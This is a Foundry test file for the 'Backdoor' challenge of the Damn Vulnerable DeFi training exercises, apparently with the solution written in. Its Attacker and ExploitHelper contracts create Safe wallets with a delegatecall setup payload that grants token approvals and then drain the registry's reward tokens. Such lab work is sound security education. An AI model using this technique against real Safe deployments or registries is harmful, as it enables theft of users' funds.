// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        new Attacker(walletFactory, singletonCopy, walletRegistry, token, recovery, users);
    }

    function execute() public {
        token.approve(recovery, type(uint256).max);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

// Helper contract with deployed code that Safe delegatecalls into during setup
contract ExploitHelper {
    function execute(address token, address spender) external {
        DamnValuableToken(token).approve(spender, type(uint256).max);
    }
}

contract Attacker {

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    address recovery;
    address[] users;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    constructor(SafeProxyFactory _walletFactory, Safe _singletonCopy, WalletRegistry _walletRegistry, DamnValuableToken _token, address _recovery, address[] memory _users){

        walletFactory = _walletFactory;
        singletonCopy = _singletonCopy;
        walletRegistry = _walletRegistry;
        token = _token; 
        recovery = _recovery;
        users = _users;

        Backdoor(); 
    }

    // function proxyCreated(SafeProxy proxy, address _singleton, bytes calldata initializer, uint256 saltNonce) external {

    // }

    function Backdoor() public {
        // Deploy helper so it has deployed bytecode (passes Safe's isContract check)
        ExploitHelper helper = new ExploitHelper();

        // Encode the execute call so the Safe approves this Attacker contract
        bytes memory payload = abi.encodeCall(helper.execute, (address(token), address(this)));

        // 1-element array to hold the owner for each loop iteration
        address[] memory owners = new address[](1);

        for(uint256 i = 0; i < users.length; i++) {
            owners[0] = users[i];

            bytes memory initializer = abi.encodeCall(
                singletonCopy.setup,
                (
                    owners,                              // _owners (1-element array)
                    1,                                   // _threshold (must be 1)
                    address(helper),                     // to (delegatecall target with deployed bytecode)
                    payload,                             // data for `to`
                    address(0),                          // fallbackHandler (registry requires address(0))
                    address(0),                          // paymentToken
                    0,                                   // payment
                    payable(address(0))                  // paymentReceiver
                )
            );

            address proxy = address(walletFactory.createProxyWithCallback(
                address(singletonCopy),
                initializer,
                0,
                walletRegistry
            ));

            // Pull the 10 DVT tokens sent by the registry from the Safe to recovery
            token.transferFrom(proxy, recovery, 10 ether);
        }

    }

    receive() payable external {}
}
